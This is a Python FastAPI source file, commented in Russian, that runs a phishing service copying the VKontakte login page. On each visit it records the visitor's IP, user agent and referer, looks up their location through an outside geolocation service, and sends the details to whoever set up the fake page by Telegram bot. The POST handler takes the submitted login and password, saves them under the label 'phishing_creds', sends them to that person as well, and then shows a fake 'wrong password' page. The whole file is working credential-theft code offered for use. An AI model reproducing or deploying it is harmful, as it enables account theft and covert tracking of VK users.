from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import datetime
import json
import db
import aiohttp
import asyncio
from aiogram import Bot

app = FastAPI()

# Глобальный бот для отправки уведомлений (инициализируется в main.py)
BOT = None

def set_bot(bot_instance):
    global BOT
    BOT = bot_instance

@app.get("/mirror/{path}")
async def mirror_log(request: Request, path: str):
    mirror = db.get_mirror(path)
    if not mirror:
        return HTMLResponse("<h1>404 — Зеркало не найдено</h1>", status_code=404)
    db.increment_mirror_visits(path)

    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")

    geo = {}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                geo = await resp.json()
    except:
        geo = {"status": "fail"}

    # Сохраняем в лог
    log_entry = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "mirror": path,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_log_mirror", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))

    # Отправляем уведомление создателю зеркала
    created_by = mirror[1]  # поле created_by
    if BOT:
        try:
            msg = f"🕵️ <b>Новое посещение вашего зеркала</b>\n\nIP: <code>{client_ip}</code>\nСтрана: {geo.get('country', '—')}\nГород: {geo.get('city', '—')}\nПровайдер: {geo.get('isp', '—')}\nUser-Agent: {user_agent}\nРеферер: {referer}"
            await BOT.send_message(created_by, msg, parse_mode="HTML")
        except:
            pass

    # HTML-страница с маскировкой под ВК
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Вход в ВКонтакте</title>
        <style>
            body {{ background: #e5ebf1; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .login-box {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); width: 360px; text-align: center; }}
            .login-box img {{ width: 80px; margin-bottom: 20px; }}
            .login-box h2 {{ color: #2c3e50; }}
            .login-box input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }}
            .login-box button {{ width: 100%; padding: 10px; background: #4a76a8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }}
            .login-box button:hover {{ background: #3a5f85; }}
            .error {{ color: red; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://vk.com/images/icons/favicons/favicon_vk_256.ico" alt="VK">
            <h2>Вход в ВКонтакте</h2>
            <form action="/mirror/{path}" method="POST">
                <input type="text" name="login" placeholder="Телефон или email" required>
                <input type="password" name="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="error">⚠️ Если у вас проблемы со входом, попробуйте позже.</div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)

@app.post("/mirror/{path}")
async def mirror_post(request: Request, path: str):
    form = await request.form()
    login = form.get("login")
    password = form.get("password")
    client_ip = request.client.host
    log_entry = {
        "login": login,
        "password": password,
        "ip": client_ip,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_creds", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))

    # Отправляем создателю зеркала логин/пароль
    mirror = db.get_mirror(path)
    if mirror and BOT:
        try:
            msg = f"🔑 <b>Получены учётные данные</b>\n\nЛогин: {login}\nПароль: {password}\nIP: {client_ip}"
            await BOT.send_message(mirror[1], msg, parse_mode="HTML")
        except:
            pass

    html = f"""
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Ошибка</title></head>
    <body style="background:#e5ebf1;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="background:white;padding:40px;border-radius:10px;text-align:center;">
            <h2 style="color:red;">Неверный логин или пароль</h2>
            <p>Пожалуйста, попробуйте снова.</p>
            <a href="/mirror/{path}">Вернуться</a>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
